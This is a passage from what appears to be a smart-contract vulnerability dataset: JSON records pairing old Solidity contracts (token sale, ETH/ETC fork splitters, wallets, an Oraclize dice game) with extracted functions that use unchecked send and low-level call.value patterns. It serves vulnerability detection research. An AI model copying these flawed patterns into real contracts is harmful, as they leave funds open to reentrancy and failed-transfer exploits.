  "content": "pragma solidity ^ 0.4 .6;\ncontract owned {\n address public owner;\n function owned() {\n owner = msg.sender;\n }\n modifier onlyOwner {\n if (msg.sender != owner) throw;\n _;\n }\n function transferOwnership(address newOwner) onlyOwner {\n owner = newOwner;\n }\n}\ncontract CampaignBeneficiary is owned{\n address public Resilience;\n function CampaignBeneficiary() {\n Resilience = 0xDA922E473796bc372d4a2cb95395ED17aF8b309B;\n bytes4 setBeneficiarySig = bytes4(sha3(\"setBeneficiary()\"));\n if (!Resilience.call(setBeneficiarySig)) throw;\n }\n function() payable {\n if(msg.sender != Resilience) throw;\n }\n function simulatePathwayFromBeneficiary() public payable {\n bytes4 buySig = bytes4(sha3(\"buy()\"));\n if (!Resilience.call.value(msg.value)(buySig)) throw;\n bytes4 transferSig = bytes4(sha3(\"transfer(address,uint256)\"));\n if (!Resilience.call(transferSig, msg.sender, msg.value)) throw;\n }\n function sell(uint256 _value) onlyOwner {\n bytes4 sellSig = bytes4(sha3(\"sell(uint256)\"));\n if (!Resilience.call(sellSig, _value)) throw;\n }\n function withdraw(uint256 _value) onlyOwner {\n if (!msg.sender.send(_value)) throw;\n }\n function closeCampaign() onlyOwner {\n bytes4 closeCampaignSig = bytes4(sha3(\"closeCampaign()\"));\n if (!Resilience.call(closeCampaignSig)) throw;\n }\n}",
  "extract_feature": [
    "function CampaignBeneficiary() {\nResilience = 0xDA922E473796bc372d4a2cb95395ED17aF8b309B;\nbytes4 setBeneficiarySig = bytes4(sha3(\"setBeneficiary()\"));\nif (!Resilience.call(setBeneficiarySig)) throw;\n}",
    "function simulatePathwayFromBeneficiary() public payable {\nbytes4 buySig = bytes4(sha3(\"buy()\"));\nif (!Resilience.call.value(msg.value)(buySig)) throw;\nbytes4 transferSig = bytes4(sha3(\"transfer(address,uint256)\"));\nif (!Resilience.call(transferSig, msg.sender, msg.value)) throw;\n}",
    "function sell(uint256 _value) onlyOwner {\nbytes4 sellSig = bytes4(sha3(\"sell(uint256)\"));\nif (!Resilience.call(sellSig, _value)) throw;\n}",
    "function withdraw(uint256 _value) onlyOwner {\nif (!msg.sender.send(_value)) throw;\n}",
    "function closeCampaign() onlyOwner {\nbytes4 closeCampaignSig = bytes4(sha3(\"closeCampaign()\"));\nif (!Resilience.call(closeCampaignSig)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1635"
  },
  "filename": "40055.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\npragma solidity ^0.4.4;\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\npragma solidity ^0.4.4;\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n}\npragma solidity ^0.4.4;\ncontract CampaignToken is HumanStandardToken {\n address public tokenController;\n modifier onlyController { if (msg.sender != tokenController) throw; _; }\n function CampaignToken() HumanStandardToken(0,\"CharityDAO Token\",18,\"GIVE\") {\n tokenController = msg.sender;\n }\n function createTokens(address beneficiary, uint amount\n ) onlyController returns (bool success) {\n if (sealed()) throw;\n balances[beneficiary] += amount;\n totalSupply += amount;\n Transfer(0, beneficiary, amount);\n return true;\n }\n function seal() onlyController returns (bool success) {\n tokenController = 0;\n return true;\n }\n function sealed() constant returns (bool) {\n return tokenController == 0;\n }\n}\npragma solidity ^0.4.4;\ncontract Campaign {\n uint public startFundingTime;\n uint public endFundingTime;\n uint public maximumFunding;\n uint public totalCollected;\n CampaignToken public tokenContract;\n address public vaultContract;\n function Campaign(\n uint _startFundingTime,\n uint _endFundingTime,\n uint _maximumFunding,\n address _vaultContract\n ) {\n if ((_endFundingTime < now) ||\n (_endFundingTime <= _startFundingTime) ||\n (_maximumFunding > 10000 ether) ||\n (_vaultContract == 0))\n {\n throw;\n }\n startFundingTime = _startFundingTime;\n endFundingTime = _endFundingTime;\n maximumFunding = _maximumFunding;\n tokenContract = new CampaignToken ();\n vaultContract = _vaultContract;\n }\n function () payable {\n doPayment(msg.sender);\n }\n function proxyPayment(address _owner) payable {\n doPayment(_owner);\n }\n function doPayment(address _owner) internal {\n if ((now<startFundingTime) ||\n (now>endFundingTime) ||\n (tokenContract.tokenController() == 0) ||\n (msg.value == 0) ||\n (totalCollected + msg.value > maximumFunding))\n {\n throw;\n }\n totalCollected += msg.value;\n if (!vaultContract.send(msg.value)) {\n throw;\n }\n if (!tokenContract.createTokens(_owner, msg.value)) {\n throw;\n }\n return;\n }\n function seal() {\n if (now < endFundingTime) throw;\n tokenContract.seal();\n }\n}",
  "extract_feature": [
    "function doPayment(address _owner) internal {\nif ((now<startFundingTime) ||\n(now>endFundingTime) ||\n(tokenContract.tokenController() == 0) ||\n(msg.value == 0) ||\n(totalCollected + msg.value > maximumFunding))\n{\nthrow;\n}\ntotalCollected += msg.value;\nif (!vaultContract.send(msg.value)) {\nthrow;\n}\nif (!tokenContract.createTokens(_owner, msg.value)) {\nthrow;\n}\nreturn;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1636"
  },
  "filename": "40342.sol",
  "content": "contract AmIOnTheFork {\n function forked() constant returns(bool);\n}\ncontract Ethsplit {\n function split(address ethAddress, address etcAddress) {\n if (amIOnTheFork.forked()) {\n ethAddress.call.value(msg.value)();\n }\n else {\n uint fee = msg.value/100;\n fees.send(fee);\n etcAddress.call.value(msg.value-fee)();\n }\n }\n function () {\n throw;\n }\n AmIOnTheFork amIOnTheFork = AmIOnTheFork(0x2bd2326c993dfaef84f696526064ff22eba5b362);\n address fees = 0xdE17a240b031a4607a575FE13122d5195B43d6fC;\n}",
  "extract_feature": [
    "function split(address ethAddress, address etcAddress) {\nif (amIOnTheFork.forked()) {\nethAddress.call.value(msg.value)();\n}\nelse {\nuint fee = msg.value/100;\nfees.send(fee);\netcAddress.call.value(msg.value-fee)();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1637"
  },
  "filename": "40357.sol",
  "content": "contract AmIOnTheFork {\n function forked() constant returns(bool);\n}\ncontract SellETCSafely {\n AmIOnTheFork amIOnTheFork = AmIOnTheFork(0x2bd2326c993dfaef84f696526064ff22eba5b362);\n address feeRecipient = 0x46a1e8814af10Ef6F1a8449dA0EC72a59B29EA54;\n function split(address ethDestination, address etcDestination) {\n if (amIOnTheFork.forked()) {\n ethDestination.call.value(msg.value)();\n } else {\n uint fee = msg.value / 100;\n feeRecipient.send(fee);\n etcDestination.call.value(msg.value - fee)();\n }\n }\n function () {\n throw;\n }\n}",
  "extract_feature": [
    "function split(address ethDestination, address etcDestination) {\nif (amIOnTheFork.forked()) {\nethDestination.call.value(msg.value)();\n} else {\nuint fee = msg.value / 100;\nfeeRecipient.send(fee);\netcDestination.call.value(msg.value - fee)();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1638"
  },
  "filename": "40362.sol",
  "content": "contract AmIOnTheFork {\n function forked() constant returns(bool);\n}\ncontract SellETCSafely {\n AmIOnTheFork amIOnTheFork = AmIOnTheFork(0x2bd2326c993dfaef84f696526064ff22eba5b362);\n address feeRecipient = 0x46a1e8814af10Ef6F1a8449dA0EC72a59B29EA54;\n function split(address ethDestination, address etcDestination) {\n if (amIOnTheFork.forked()) {\n ethDestination.call.value(msg.value);\n } else {\n uint fee = msg.value / 100;\n feeRecipient.send(fee);\n etcDestination.call.value(msg.value - fee)();\n }\n }\n function () {\n throw;\n }\n}",
  "extract_feature": [
    "function split(address ethDestination, address etcDestination) {\nif (amIOnTheFork.forked()) {\nethDestination.call.value(msg.value);\n} else {\nuint fee = msg.value / 100;\nfeeRecipient.send(fee);\netcDestination.call.value(msg.value - fee)();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1639"
  },
  "filename": "40366.sol",
  "content": "contract TriWallet {\n bool public thisIsFork;\n address public etcWallet;\n address public ethWallet;\n event ETCWalletCreated(address etcWalletAddress);\n event ETHWalletCreated(address ethWalletAddress);\n function TriWallet () {\n thisIsFork = BranchSender (0x23141df767233776f7cbbec497800ddedaa4c684).isRightBranch ();\n etcWallet = new BranchWallet (msg.sender, !thisIsFork);\n ethWallet = new BranchWallet (msg.sender, thisIsFork);\n ETCWalletCreated (etcWallet);\n ETHWalletCreated (ethWallet);\n }\n function distribute () {\n if (thisIsFork) {\n if (!ethWallet.send (this.balance)) throw;\n } else {\n if (!etcWallet.send (this.balance)) throw;\n }\n }\n}\ncontract BranchWallet {\n address public owner;\n bool public isRightBranch;\n function BranchWallet (address _owner, bool _isRightBranch) {\n owner = _owner;\n isRightBranch = _isRightBranch;\n }\n function () {\n if (!isRightBranch) throw;\n }\n function send (address _to, uint _value) {\n if (!isRightBranch) throw;\n if (msg.sender != owner) throw;\n if (!_to.send (_value)) throw;\n }\n function execute (address _to, uint _value, bytes _data) {\n if (!isRightBranch) throw;\n if (msg.sender != owner) throw;\n if (!_to.call.value (_value)(_data)) throw;\n }\n}\ncontract BranchSender {\n bool public isRightBranch;\n}",
  "extract_feature": [
    "function distribute () {\nif (thisIsFork) {\nif (!ethWallet.send (this.balance)) throw;\n} else {\nif (!etcWallet.send (this.balance)) throw;\n}\n}",
    "function send (address _to, uint _value) {\nif (!isRightBranch) throw;\nif (msg.sender != owner) throw;\nif (!_to.send (_value)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb163a"
  },
  "filename": "40392.sol",
  "content": "contract chal2sweep {\n address chal = 0x08d698358b31ca6926e329879db9525504802abf;\n address noel = 0x1488e30b386903964b2797c97c9a3a678cf28eca;\n modifier only_noel { if (msg.sender == noel) _ }\n modifier msg_value_not(uint _amount) {\n if (msg.value != _amount) _\n }\n function withdraw(uint _amount) only_noel {\n if (!noel.send(_amount)) throw;\n }\n function kill() only_noel {\n suicide(noel);\n }\n function () msg_value_not(10000000000000000000) {\n if (!chal.call(\"withdrawEtherOrThrow\", 10000000000000000000))\n throw;\n }\n}",
  "extract_feature": [
    "function withdraw(uint _amount) only_noel {\nif (!noel.send(_amount)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb163b"
  },
  "filename": "40458.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n return mint;\n }\n}\ncontract Dice is usingOraclize {\n uint public pwin = 5000;\n uint public edge = 200;\n uint public maxWin = 100;\n uint public minBet = 1 finney;\n uint public maxInvestors = 5;\n uint public ownerEdge = 50;\n uint public divestFee = 50;\n uint constant safeGas = 25000;\n uint constant oraclizeGasLimit = 150000;\n struct Investor {\n address user;\n uint capital;\n }\n mapping(uint => Investor) investors;\n uint public numInvestors = 0;\n mapping(address => uint) investorIDs;\n uint public invested = 0;\n address owner;\n bool public isStopped;\n struct Bet {\n address user;\n uint bet;\n uint roll;\n uint fee;\n }\n mapping (bytes32 => Bet) bets;\n bytes32[] betsKeys;\n uint public amountWagered = 0;\n int public profit = 0;\n int public takenProfit = 0;\n int public ownerProfit = 0;\n function Dice(uint pwinInitial, uint edgeInitial, uint maxWinInitial, uint minBetInitial, uint maxInvestorsInitial, uint ownerEdgeInitial, uint divestFeeInitial) {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n pwin = pwinInitial;\n edge = edgeInitial;\n maxWin = maxWinInitial;\n minBet = minBetInitial;\n maxInvestors = maxInvestorsInitial;\n ownerEdge = ownerEdgeInitial;\n divestFee = divestFeeInitial;\n owner = msg.sender;\n }\n function() {\n bet();\n }\n function bet() {\n if (isStopped) throw;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n if (msg.value < oraclizeFee) throw;\n uint betValue = msg.value - oraclizeFee;\n if ((((betValue * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (betValue >= minBet)) {\n bytes32 myid = oraclize_query(\"URL\", \"json(https:\n bets[myid] = Bet(msg.sender, betValue, 0, oraclizeFee);\n betsKeys.push(myid);\n } else {\n throw;\n }\n }\n function numBets() constant returns(uint) {\n return betsKeys.length;\n }\n function minBetAmount() constant returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n return oraclizeFee+minBet;\n }\n function safeSend(address addr, uint value) internal {\n if (!(addr.call.gas(safeGas).value(value)())){\n ownerProfit += int(value);\n }\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n if (msg.sender != oraclize_cbAddress()) throw;\n Bet thisBet = bets[myid];\n if (thisBet.bet>0) {\n if ((isStopped == false)&&(((thisBet.bet * ((10000 - edge) - pwin)) / pwin ) <= maxWin * getBankroll() / 10000)) {\n uint roll = parseInt(result);\n if (roll<1 || roll>10000){\n safeSend(thisBet.user, thisBet.bet);\n return;\n }\n bets[myid].roll = roll;\n int profitDiff;\n if (roll-1 < pwin) {\n uint winAmount = (thisBet.bet * (10000 - edge)) / pwin;\n safeSend(thisBet.user, winAmount);\n profitDiff = int(thisBet.bet - winAmount);\n } else {\n safeSend(thisBet.user, 1);\n profitDiff = int(thisBet.bet) - 1;\n }\n ownerProfit += (profitDiff*int(ownerEdge))/10000;\n profit += profitDiff-(profitDiff*int(ownerEdge))/10000;\n amountWagered += thisBet.bet;\n } else {\n safeSend(thisBet.user, thisBet.bet);\n }\n }\n }\n function getBet(uint id) constant returns(address, uint, uint, uint) {\n if(id<betsKeys.length)\n {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].user, bets[betKey].bet, bets[betKey].roll, bets[betKey].fee);\n }\n }\n function invest() {\n if (isStopped) throw;\n if (investorIDs[msg.sender]>0) {\n rebalance();\n investors[investorIDs[msg.sender]].capital += msg.value;\n invested += msg.value;\n } else {\n rebalance();\n uint investorID = 0;\n if (numInvestors<maxInvestors) {\n investorID = ++numInvestors;\n } else {\n for (uint i=1; i<=numInvestors; i++) {\n if (investors[i].capital<msg.value && (investorID==0 || investors[i].capital<investors[investorID].capital)) {\n investorID = i;\n }\n }\n }\n if (investorID>0) {\n if (investors[investorID].capital>0) {\n divest(investors[investorID].user, investors[investorID].capital);\n investorIDs[investors[investorID].user] = 0;\n }\n if (investors[investorID].capital == 0 && investorIDs[investors[investorID].user] == 0) {\n investors[investorID].user = msg.sender;\n investors[investorID].capital = msg.value;\n invested += msg.value;\n investorIDs[msg.sender] = investorID;\n } else {\n throw;\n }\n } else {\n throw;\n }\n }\n }\n function rebalance() private {\n if (takenProfit != profit) {\n uint newInvested = 0;\n uint initialBankroll = getBankroll();\n for (uint i=1; i<=numInvestors; i++) {\n investors[i].capital = getBalance(investors[i].user);\n newInvested += investors[i].capital;\n }\n invested = newInvested;\n if (newInvested != initialBankroll && numInvestors>0) {\n ownerProfit += int(initialBankroll - newInvested);\n invested += (initialBankroll - newInvested);\n }\n takenProfit = profit;\n }\n }\n function divest(address user, uint amount) private {\n if (investorIDs[user]>0) {\n rebalance();\n if (amount>getBalance(user)) {\n amount = getBalance(user);\n }\n investors[investorIDs[user]].capital -= amount;\n invested -= amount;\n uint newAmount = (amount*divestFee)/10000;\n ownerProfit += int(newAmount);\n safeSend(user, (amount-newAmount));\n }\n }\n function divest(uint amount) {\n if (msg.value>0) throw;\n divest(msg.sender, amount);\n }\n function divest() {\n if (msg.value>0) throw;\n divest(msg.sender, getBalance(msg.sender));\n }\n function getBalance(address user) constant returns(uint) {\n if (investorIDs[user]>0 && invested>0) {\n return investors[investorIDs[user]].capital * getBankroll() / invested;\n } else {\n return 0;\n }\n }\n function getBankroll() constant returns(uint) {\n uint bankroll = uint(int(invested)+profit+ownerProfit-takenProfit);\n if (this.balance < bankroll){\n log0(\"bankroll_mismatch\");\n bankroll = this.balance;\n }\n return bankroll;\n }\n function getMinInvestment() constant returns(uint) {\n if (numInvestors<maxInvestors) {\n return 0;\n } else {\n uint investorID;\n for (uint i=1; i<=numInvestors; i++) {\n if (investorID==0 || getBalance(investors[i].user)<getBalance(investors[investorID].user)) {\n investorID = i;\n }\n }\n return getBalance(investors[investorID].user);\n }\n }\n function getStatus() constant returns(uint, uint, uint, uint, uint, uint, int, uint, uint) {\n return (getBankroll(), pwin, edge, maxWin, minBet, amountWagered, profit, getMinInvestment(), betsKeys.length);\n }\n function stopContract() {\n if (owner != msg.sender) throw;\n isStopped = true;\n }\n function resumeContract() {\n if (owner != msg.sender) throw;\n isStopped = false;\n }\n function forceDivestAll() {\n forceDivestAll(false);\n }\n function forceDivestAll(bool ownerTakeChangeAndProfit) {\n if (owner != msg.sender) throw;\n for (uint investorID=1; investorID<=numInvestors; investorID++) {\n divest(investors[investorID].user, getBalance(investors[investorID].user));\n }\n if (ownerTakeChangeAndProfit) owner.send(this.balance);\n }\n function ownerTakeProfit() {\n ownerTakeProfit(false);\n }\n function ownerTakeProfit(bool takeChange) {\n if (owner != msg.sender) throw;\n if (takeChange){\n uint investorsCapital = 0;\n for (uint i=1; i<=numInvestors; i++) {\n investorsCapital += investors[i].capital;\n }\n if ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\n owner.send(this.balance);\n ownerProfit = 0;\n }\n } else {\n owner.send(uint(ownerProfit));\n ownerProfit = 0;\n }\n }\n}",
  "extract_feature": [
    "function forceDivestAll(bool ownerTakeChangeAndProfit) {\nif (owner != msg.sender) throw;\nfor (uint investorID=1; investorID<=numInvestors; investorID++) {\ndivest(investors[investorID].user, getBalance(investors[investorID].user));\n}\nif (ownerTakeChangeAndProfit) owner.send(this.balance);\n}",
    "function ownerTakeProfit(bool takeChange) {\nif (owner != msg.sender) throw;\nif (takeChange){\nuint investorsCapital = 0;\nfor (uint i=1; i<=numInvestors; i++) {\ninvestorsCapital += investors[i].capital;\n}\nif ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\nowner.send(this.balance);\nownerProfit = 0;\n}\n} else {\nowner.send(uint(ownerProfit));\nownerProfit = 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb163c"
  },
  "filename": "40459.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + 